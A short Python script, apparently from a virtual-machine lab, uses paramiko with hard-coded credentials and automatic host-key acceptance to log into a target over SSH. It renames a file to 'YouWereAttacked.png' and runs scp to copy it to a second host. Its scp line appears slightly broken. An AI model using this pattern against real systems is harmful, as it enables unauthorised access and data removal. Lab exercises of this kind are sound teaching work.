import paramiko

def connect_to_target(target_ip, source_ip):
    port = 2222                  
    username = "vboxuser" #geändert zu vm user
    password = "Attacke" #geändert zu vmuser

    rename= "mv ~/daisy/src/daisy/communication/ThatCouldBeMaleware.png ~/daisy/src/daisy/communication/YouWereAttacked.png"
    #scp datei.txt benutzer@anderer-server:/ziel/pfad/
    copy = "scp -P 2222 ~/daisy/src/daisy/communication/YouWereAttacked.png vboxunser:"+source_ip+"~/daisy/src/daisy/communication/YouWereAttacked.png"

    # SSH-Client 
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # akzeptiert unbekannte Hosts automatisch

    try:
        client.connect(target_ip, port=port, username=username, password=password)

        # Beispiel: Befehl ausführen
        stdin, stdout, stderr = client.exec_command(rename)
        stdin, stdout, stderr = client.exec_command(copy)

        print("stdout:",stdout.read().decode())
        print("stderr:",stderr.read().decode())

    except Exception as e:
        print(e)
    finally:
        client.close()
        print("Connection closed.")

